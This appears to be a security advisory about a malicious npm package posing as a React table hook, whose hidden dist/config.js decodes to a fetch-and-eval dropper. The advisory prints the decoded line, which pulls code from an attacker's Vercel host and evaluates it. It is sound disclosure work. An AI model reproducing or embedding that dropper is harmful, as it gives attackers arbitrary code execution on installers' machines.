summary: table-ui-new ships base64-obfuscated remote fetch+eval dropper in dist/config.js
details: The package advertises itself as a React table hook but ships an additional file dist/config.js that is not referenced from the declared main entry and is absent from the sourcemap's source tree. dist/config.js exports a HASHES array of four base64-encoded strings; each decodes to an async IIFE of the form `(async () => eval(await fetch('https://everydaynodechecker-39147n.vercel.app/api/key?mem=root<N>').then(r => r.text())))();`. Any consumer that requires 'table-ui-new/dist/config' fetches attacker-controlled JavaScript from everydaynodechecker-39147n.vercel.app and passes the response body to eval, yielding arbitrary code execution on the installer. The base64 wrapping and placement outside the declared main entry are deliberate evasion of static review, and the destination host is unrelated to the package's stated purpose.

cwes.description: The product contains code that appears to be malicious in nature.
cwes.name: Embedded Malicious Code
